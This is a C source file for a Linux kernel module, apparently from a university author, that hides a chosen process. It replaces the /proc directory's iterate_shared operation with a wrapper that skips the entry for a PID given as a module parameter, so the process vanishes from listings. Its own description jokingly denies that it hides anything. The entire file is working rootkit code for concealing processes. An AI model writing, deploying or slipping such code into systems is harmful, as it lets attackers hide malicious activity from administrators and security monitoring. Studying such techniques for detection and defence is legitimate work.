#include "asm-generic/errno-base.h"
#include "asm-generic/fcntl.h"
#include "linux/container_of.h"
#include "linux/err.h"
#include "linux/fs.h"
#include "linux/kstrtox.h"
#include "linux/moduleparam.h"
#include "linux/printk.h"
#include "linux/slab.h"
#include <linux/module.h>
#include <linux/init.h>

//### VARIABLE AREA

static const struct file_operations *original_file_ops;
struct faked_dir_context {
	struct dir_context *orig_ctx;
	struct dir_context ctx;
};

//### FUNCTION AREA

static int target;
module_param(target, int, 0444);

static bool faked_actor(struct dir_context *ctx, const char *name, int namelen,
			loff_t pos, u64 ino, unsigned type)
{
	struct faked_dir_context *tmp =
		container_of(ctx, struct faked_dir_context, ctx);
	tmp->orig_ctx->pos = tmp->ctx.pos;

	pid_t pid;
	if (!kstrtoint(name, 10, &pid) && pid == target) {
		return true;
	}

	return tmp->orig_ctx->actor(tmp->orig_ctx, name, namelen, pos, ino,
				    type);
}

static int faked_iterate_shared(struct file *file, struct dir_context *orig_ctx)
{
	struct faked_dir_context ctx = { .orig_ctx = orig_ctx,
					 .ctx = (struct dir_context){
						 .actor = faked_actor,
						 .pos = orig_ctx->pos,
					 } };

	int ret = original_file_ops->iterate_shared(file, &ctx.ctx);
	orig_ctx->pos = ctx.ctx.pos;

	return ret;
}

static int __init hide_pid_init(void)
{
	int err;

	struct file *proc_dir;
	struct file_operations *faked_file_ops;

	proc_dir = filp_open("/proc", O_RDONLY, 0);
	if (IS_ERR(proc_dir)) {
		err = PTR_ERR(proc_dir);
		goto err_proc_dir;
	}

	faked_file_ops = kzalloc(sizeof(struct file_operations), GFP_KERNEL);
	if (!faked_file_ops) {
		err = -ENOMEM;
		goto err_file_ops;
	}

	original_file_ops = proc_dir->f_op;
	*faked_file_ops = *proc_dir->f_op;
	faked_file_ops->iterate_shared = faked_iterate_shared;
	proc_dir->f_op = faked_file_ops;
	proc_dir->f_inode->i_fop = faked_file_ops;

	// pr_info("proc_dir: %px, fake_ops: %px, org_ops: %px\n", proc_dir,
	// 	faked_file_ops, original_file_ops);

	filp_close(proc_dir, NULL);

	return 0;

err_file_ops:
	filp_close(proc_dir, NULL);
err_proc_dir:
	return err;
}

static void __exit hide_pid_exit(void)
{
	struct file *proc_dir;
	const struct file_operations *fops;

	proc_dir = filp_open("/proc", O_RDONLY, 0);
	if (IS_ERR(proc_dir))
		return;

	fops = proc_dir->f_op;
	proc_dir->f_op = original_file_ops;
	proc_dir->f_inode->i_fop = original_file_ops;
	//pr_info("proc_dir: %px, fake_ops: %px, org_ops: %px\n", proc_dir, fops,
	//	original_file_ops);
	kfree(fops);

	filp_close(proc_dir, NULL);
}

module_init(hide_pid_init);
module_exit(hide_pid_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jonas Dohmen <jonas.dohmen@rwth-aachen.de>");
MODULE_DESCRIPTION(
	"Totally legit linux kernel module that is not hiding anything");
MODULE_VERSION("1.0");